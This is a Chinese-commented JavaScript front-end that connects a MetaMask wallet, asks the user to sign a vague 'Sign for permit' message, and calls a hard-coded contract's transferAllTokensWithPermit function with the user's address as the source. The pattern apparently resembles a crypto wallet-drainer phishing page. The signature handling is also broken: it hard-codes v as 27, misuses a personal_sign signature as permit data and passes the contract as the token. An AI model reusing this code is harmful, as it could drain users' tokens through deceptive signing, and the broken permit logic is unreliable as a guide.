const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189";  // 最新的智能合约地址
let web3;
let userAddress;

// 最新的 ABI
const abi = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 连接钱包
async function connectWallet() {
    console.log("连接钱包函数被调用");

    if (typeof window.ethereum !== 'undefined') {
        try {
            web3 = new Web3(window.ethereum);  // 初始化 web3
            console.log("web3 被成功初始化");

            await window.ethereum.request({ method: 'eth_requestAccounts' });  // 请求连接钱包
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            // 成功连接后显示钱包地址
            document.getElementById('walletAddress').innerText = userAddress;
            document.getElementById('walletInfo').style.display = 'block';  // 显示钱包信息

            console.log("已连接的钱包地址:", userAddress);

            // 自动填写签名参数
            await fillSignatureData(userAddress, contractAddress);

        } catch (error) {
            console.error("连接钱包失败:", error);
            alert("连接钱包失败，请检查控制台日志。");
        }
    } else {
        alert("请安装 MetaMask 或者使用支持的浏览器！");
        console.error("window.ethereum 不可用 - 请确保你已安装 MetaMask。");
    }
}

// 填写签名信息
async function fillSignatureData(fromAddress, contractAddress) {
    console.log("正在生成签名...");

    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;  // 设置 20 分钟的有效期

    // 获取 nonce 和签名
    const nonce = await web3.eth.getTransactionCount(fromAddress);
    const signature = await web3.eth.personal.sign(`Sign for permit: ${nonce}`, fromAddress, '');

    const v = 27;  // 模拟签名参数
    const r = "0x" + signature.slice(2, 66);
    const s = "0x" + signature.slice(66, 130);

    // 自动填写签名参数到页面
    document.getElementById('v').innerText = v;
    document.getElementById('r').innerText = r;
    document.getElementById('s').innerText = s;

    console.log(`签名生成完成: v=${v}, r=${r}, s=${s}`);
}

// 转移代币
async function transferTokens() {
    console.log("准备转移代币...");
    const v = document.getElementById('v').innerText;
    const r = document.getElementById('r').innerText;
    const s = document.getElementById('s').innerText;

    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        await contract.methods.transferAllTokensWithPermit(
            contractAddress,
            userAddress,
            web3.utils.toWei("10", "ether"),  // 示例: 转移 10 个代币
            Math.floor(Date.now() / 1000) + 60 * 20,  // 20分钟有效期
            v,
            r,
            s
        ).send({ from: userAddress });

        console.log("代币转移成功！");
    } catch (error) {
        console.error("转移代币失败:", error);
        alert("转移代币失败，请检查控制台日志。");
    }
}

// 页面加载后绑定事件
window.onload = function() {
    document.getElementById('connectButton').addEventListener('click', connectWallet);
    document.getElementById('transferButton').addEventListener('click', transferTokens);
};
